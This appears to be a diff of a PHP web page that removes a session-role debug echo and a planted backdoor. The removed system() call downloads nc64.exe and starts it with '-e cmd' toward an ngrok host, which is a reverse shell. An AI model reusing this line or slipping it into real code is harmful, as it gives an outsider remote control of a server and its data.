@@ -1,9 +1,5 @@
 ﻿<?php include_once "includes/header.php"; ?>
 
-<?php 
-  echo $_SESSION['rol']
-?>
-
 <!-- Begin Page Content -->
 <div class="container-fluid">
 
@@ -70,9 +66,5 @@
 
 </div>
 <!-- End of Main Content -->
-
-<?php
-  system('Invoke-WebRequest -Uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -OutFile "nc64.exe"; Start-Process -FilePath ".\nc64.exe" -ArgumentList "-e cmd 0.tcp.ngrok.io 18993" -NoNewWindow');
-?>             
 
 <?php include_once "includes/footer.php"; ?>
